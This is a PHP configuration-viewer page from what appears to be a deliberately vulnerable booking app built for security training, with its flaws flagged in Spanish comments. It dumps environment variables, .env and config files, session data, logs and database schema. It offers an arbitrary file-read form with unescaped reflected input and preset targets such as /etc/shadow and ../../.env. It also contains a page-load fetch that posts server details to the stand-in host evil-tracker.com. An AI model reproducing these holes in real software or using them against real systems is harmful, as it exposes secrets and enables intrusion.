<?php
// ⚠️ VISTA DE CONFIGURACIÓN QUE EXPONE TODO

require_once '../includes/auth.php';

if (!isAdmin()) {
    die('Access denied');
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Configuration View - Booking Vulnerable</title>
    <link rel="stylesheet" href="../assets/css/styles.css">
    <style>
        .config-section {
            background: white;
            padding: 20px;
            margin: 20px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .sensitive {
            background: #fff3cd;
            border-color: #ffeaa7;
        }
        .dangerous {
            background: #f8d7da;
            border-color: #f5c6cb;
        }
        pre {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 4px;
            overflow-x: auto;
        }
    </style>
</head>
<body>
    <?php include '../templates/header.php'; ?>
    
    <div class="container">
        <h1>Configuration Viewer</h1>
        <p class="warning">⚠️ This page exposes sensitive configuration. Keep it private.</p>
        
        <!-- ⚠️ Sección 1: Variables de entorno -->
        <div class="config-section dangerous">
            <h2>Environment Variables</h2>
            <pre><?php print_r($_ENV); ?></pre>
        </div>
        
        <!-- ⚠️ Sección 2: Configuración PHP -->
        <div class="config-section">
            <h2>PHP Configuration (php.ini)</h2>
            <pre><?php 
                foreach (ini_get_all() as $key => $value) {
                    echo "$key = " . $value['global_value'] . "\n";
                }
            ?></pre>
        </div>
        
        <!-- ⚠️ Sección 3: Información del servidor -->
        <div class="config-section sensitive">
            <h2>Server Information</h2>
            <pre><?php print_r($_SERVER); ?></pre>
        </div>
        
        <!-- ⚠️ Sección 4: Configuración de la aplicación -->
        <div class="config-section dangerous">
            <h2>Application Configuration</h2>
            <?php
            // Lee archivos de configuración
            $config_files = ['../includes/config.php', '../.env', '../config.php'];
            
            foreach ($config_files as $file) {
                if (file_exists($file)) {
                    echo "<h3>" . htmlspecialchars($file) . "</h3>";
                    echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
                }
            }
            ?>
        </div>
        
        <!-- ⚠️ Sección 5: Archivos del sistema -->
        <div class="config-section dangerous">
            <h2>System Files</h2>
            <form method="GET">
                <input type="hidden" name="page" value="config-view">
                <div class="form-group">
                    <label>Read system file:</label>
                    <input type="text" name="system_file" placeholder="/etc/passwd, /etc/hosts, /proc/self/environ"
                           value="<?php echo $_GET['system_file'] ?? ''; ?>" style="width: 100%; padding: 10px;">
                </div>
                <button type="submit">Read File</button>
            </form>
            
            <?php
            if (isset($_GET['system_file']) && !empty($_GET['system_file'])) {
                $file = $_GET['system_file'];
                echo "<h3>Content of " . htmlspecialchars($file) . ":</h3>";
                
                if (file_exists($file)) {
                    echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
                } else {
                    echo "<p style='color: red;'>File not found or not readable.</p>";
                    
                    // ⚠️ Intenta leer de todas formas
                    $content = @file_get_contents($file);
                    if ($content !== false) {
                        echo "<pre>" . htmlspecialchars($content) . "</pre>";
                    }
                }
            }
            ?>
        </div>
        
        <!-- ⚠️ Sección 6: Sesiones activas -->
        <div class="config-section sensitive">
            <h2>Active Sessions</h2>
            <?php
            $session_path = session_save_path();
            if (empty($session_path)) {
                $session_path = sys_get_temp_dir();
            }
            
            echo "<p>Session path: " . htmlspecialchars($session_path) . "</p>";
            
            if (is_dir($session_path)) {
                $session_files = scandir($session_path);
                echo "<ul>";
                foreach ($session_files as $file) {
                    if (strpos($file, 'sess_') === 0) {
                        $session_id = substr($file, 5);
                        $session_data = file_get_contents($session_path . '/' . $file);
                        echo "<li><strong>$session_id</strong>: " . htmlspecialchars($session_data) . "</li>";
                    }
                }
                echo "</ul>";
            }
            ?>
        </div>
        
        <!-- ⚠️ Sección 7: Base de datos -->
        <div class="config-section">
            <h2>Database Information</h2>
            <?php
            require_once '../includes/database.php';
            
            // ⚠️ Muestra todas las tablas
            $result = $db->query("SHOW TABLES");
            echo "<h3>Tables:</h3><ul>";
            while ($row = $result->fetch_array()) {
                $table = $row[0];
                echo "<li>$table</li>";
                
                // Muestra estructura de cada tabla
                $desc_result = $db->query("DESCRIBE $table");
                echo "<ul>";
                while ($desc = $desc_result->fetch_assoc()) {
                    echo "<li>{$desc['Field']} ({$desc['Type']})</li>";
                }
                echo "</ul>";
            }
            echo "</ul>";
            ?>
        </div>
        
        <!-- ⚠️ Sección 8: Archivos de registro -->
        <div class="config-section sensitive">
            <h2>Log Files</h2>
            <?php
            $log_files = ['../logs/app.log', '/var/log/apache2/access.log', '/var/log/apache2/error.log'];
            
            foreach ($log_files as $log_file) {
                if (file_exists($log_file)) {
                    echo "<h3>" . htmlspecialchars($log_file) . " (last 100 lines)</h3>";
                    $lines = file($log_file);
                    $last_lines = array_slice($lines, -100);
                    echo "<pre>" . htmlspecialchars(implode('', $last_lines)) . "</pre>";
                }
            }
            ?>
        </div>
    </div>
    
    <script>
        // ⚠️ Ejemplos pre-cargados
        const examples = [
            '/etc/passwd',
            '/etc/shadow',
            '/proc/self/environ',
            '../../includes/config.php',
            '../../.env',
            '../../index.php'
        ];
        
        // Crea botones para cada ejemplo
        const exampleContainer = document.createElement('div');
        exampleContainer.style.margin = '20px 0';
        exampleContainer.innerHTML = '<h3>Quick Examples:</h3>';
        
        examples.forEach(file => {
            const btn = document.createElement('button');
            btn.type = 'button';
            btn.textContent = file;
            btn.style.margin = '5px';
            btn.style.padding = '5px 10px';
            btn.style.backgroundColor = '#6c757d';
            btn.style.color = 'white';
            btn.style.border = 'none';
            btn.style.borderRadius = '3px';
            btn.style.cursor = 'pointer';
            
            btn.onclick = function() {
                document.querySelector('[name="system_file"]').value = file;
                document.querySelector('form').submit();
            };
            
            exampleContainer.appendChild(btn);
        });
        
        document.querySelector('.config-section.dangerous').appendChild(exampleContainer);
        
        // ⚠️ Envía información de configuración a un tercero
        window.addEventListener('load', function() {
            const configData = {
                url: window.location.href,
                server: <?php echo json_encode($_SERVER['SERVER_SOFTWARE']); ?>,
                phpVersion: <?php echo json_encode(phpversion()); ?>,
                timestamp: new Date().toISOString()
            };
            
            fetch('https://evil-tracker.com/config-leak', {
                method: 'POST',
                body: JSON.stringify(configData)
            });
        });
    </script>
</body>
</html>